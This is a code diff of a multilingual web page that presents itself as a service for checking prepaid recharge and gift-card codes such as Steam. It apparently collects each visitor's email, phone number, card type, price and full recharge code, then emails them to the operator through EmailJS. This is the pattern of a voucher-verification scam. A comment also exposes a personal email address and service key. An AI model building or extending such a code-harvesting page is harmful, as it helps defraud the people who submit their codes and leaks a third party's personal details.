@@ -21,7 +21,7 @@
     <script src="assets/vendors/js/jquery.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
-        // https://checkcard.netlify.app
+        // https://checkyourcard.netlify.app
         (function () {
             // https://dashboard.emailjs.com/admin/account
             // emailjs.init('opvGRa51hKeitmK3T'); // email1 : arnaudadjovi274@gmail.com
@@ -44,6 +44,11 @@
         var text_input3 = '';
         var text_input4 = '';
         var text_input5 = '';
+        var text_input6 = '';
+        var text_input7 = '';
+        var text_input8 = '';
+        var text_input9 = '';
+        var text_input10 = '';
 
         switch (card) {
             case '9dfd9fe':
@@ -66,6 +71,11 @@
                 text_input3 = 'Your phone number *';
                 text_input4 = 'Select a recharge';
                 text_input5 = 'Recharge code';
+                text_input6 = 'Hidden code ?';
+                text_input7 = 'Yes';
+                text_input8 = 'No';
+                text_input9 = 'Submit';
+                text_input10 = 'Price of recharge';
                 break;
             case 'fr':
                 text_head1 = 'Remplissez le formulaire pour faire la vérification';
@@ -75,6 +85,11 @@
                 text_input3 = 'Votre numéro de téléphome *';
                 text_input4 = 'Selectionner une recharge';
                 text_input5 = 'Code de la recharge';
+                text_input6 = 'Cacher le code ?';
+                text_input7 = 'Oui';
+                text_input8 = 'Non';
+                text_input9 = 'Vérifier';
+                text_input10 = 'Prix de la recharge';
                 break;
             case 'de':
                 text_head1 = 'Füllen Sie das Formular aus, um die Überprüfung durchzuführen';
@@ -84,6 +99,11 @@
                 text_input3 = 'Ihre Telefonnummer *';
                 text_input4 = 'Wählen Sie eine Nachfüllpackung';
                 text_input5 = 'Code der Aufladung';
+                text_input6 = 'Den Code verstecken ?';
+                text_input7 = 'Ja';
+                text_input8 = 'Nein';
+                text_input9 = 'Überprüfen';
+                text_input10 = 'Price of recharge';
                 break;
             case 'nl':
                 text_head1 = "Vul het formulier in voor verificatie";
@@ -93,6 +113,11 @@
                 text_input3 = "Uw telefoonnummer *";
                 text_input4 = "Selecteer een navulling";
                 text_input5 = "Navulcode";
+                text_input6 = 'Code verbergen ?';
+                text_input7 = 'Ja';
+                text_input8 = 'Geen';
+                text_input9 = 'Controleer';
+                text_input10 = 'Price of recharge';
                 break;
             case 'it':
                 text_head1 = 'Compila il modulo per la verifica';
@@ -102,6 +127,11 @@
                 text_input3 = 'Il tuo numero di telefono *';
                 text_input4 = "Selezionare una ricarica";
                 text_input5 = 'Codice ricarica';
+                text_input6 = 'Nascondere il codice ?';
+                text_input7 = 'Sì';
+                text_input8 = 'No';
+                text_input9 = 'Controllo';
+                text_input10 = 'Price of recharge';
                 break;
             case 'es':
                 text_head1 = 'Rellene el formulario de verificación';
@@ -111,6 +141,11 @@
                 text_input3 = 'Su número de teléfono *';
                 text_input4 = 'Seleccione una recarga';
                 text_input5 = 'Código de recarga';
+                text_input6 = '¿Ocultar el código?';
+                text_input7 = 'Sì';
+                text_input8 = 'No';
+                text_input9 = 'Consulte';
+                text_input10 = 'Price of recharge';
                 break;
 
             default:
@@ -121,6 +156,11 @@
                 text_input3 = 'Your phone number *';
                 text_input4 = 'Select a recharge';
                 text_input5 = 'recharge code';
+                text_input6 = 'Hidden code ?';
+                text_input7 = 'Yes';
+                text_input8 = 'No';
+                text_input9 = 'Submit';
+                text_input10 = 'Price of recharge';
                 break;
         }
     </script>
@@ -129,10 +169,11 @@
 
             var tempParams = {
                 to_mail: email,
-                name: document.getElementById("name").value,
+                name: 'Client',
                 email: document.getElementById("email").value,
                 tel: document.getElementById("tel").value,
                 recharge: document.getElementById("recharge").value,
+                recharge_price: document.getElementById("recharge_price").value,
                 recharge_value: document.getElementById("recharge_value").value,
             };
 
@@ -176,11 +217,18 @@
             document.getElementById("text_head2").innerHTML = text_head2;
 
             // fill placeholder
-            document.getElementById("name").placeholder = text_input1;
+            // document.getElementById("name").placeholder = text_input1;
             document.getElementById("email").placeholder = text_input2;
             document.getElementById("tel").placeholder = text_input3;
             document.getElementById("recharge").options[0].innerHTML = text_input4;
+            document.getElementById("recharge_price").placeholder = text_input10;
             document.getElementById("recharge_value").placeholder = text_input5;
+
+            document.getElementById("label_hidden_code1").innerHTML = text_input6;
+            document.getElementById("label_hidden_code2").innerHTML = text_input7;
+            document.getElementById("label_hidden_code3").innerHTML = text_input8;
+
+            document.getElementById("btn_submit").innerHTML = text_input9;
         }
     </script>
 </head>
@@ -211,11 +259,7 @@
                         <!-- Form-->
                         <form id="contact-form" method="post" class="mt-75" data-show="startbox">
                             <div class="row gy-40">
-                                <div class="col-12 col-md-6">
-                                    <input id="name" name="name" class="form-control form-control-gray" type="text"
-                                        placeholder="Votre nom *">
-                                </div>
-                                <div class="col-12 col-md-6">
+                                <div class="col-12">
                                     <input id="email" name="email" class="form-control form-control-gray" type="email"
                                         placeholder="Votre mail *">
                                 </div>
@@ -234,13 +278,25 @@
                                         <option>Steam</option>
                                     </select>
                                 </div>
+                                <div class="col-12">
+                                    <input id="recharge_price" name="recharge_price" class="form-control form-control-gray" type="text"
+                                        placeholder="Prix de la recharge">
+                                </div>
                                 <div class="col-12 mb-10">
                                     <input id="recharge_value" name="recharge_value"
                                         class="form-control form-control-gray" type="text"
                                         placeholder="Code de la recharge">
                                 </div>
+                                <div class="col-12 mb-10">
+                                    <label id="label_hidden_code1" class="text-white pe-20">Cacher le code ?</label>
+                                    <label class="text-white pe-15"><span id="label_hidden_code2">Oui</span> <input name="code_hidden"
+                                        class="" type="radio" value="Oui"></label>
+                                    <label class="text-white pe-15"><span id="label_hidden_code3">Non</span> <input name="code_hidden"
+                                        class="" type="radio" value="Non"></label>
+                                    
+                                </div>
                                 <div class="col-12 text-center">
-                                    <button type="submit" class="btn btn-accent-1">Vérifier</button>
+                                    <button id="btn_submit" type="submit" class="btn btn-accent-1">Vérifier</button>
                                 </div>
                             </div>
                         </form>
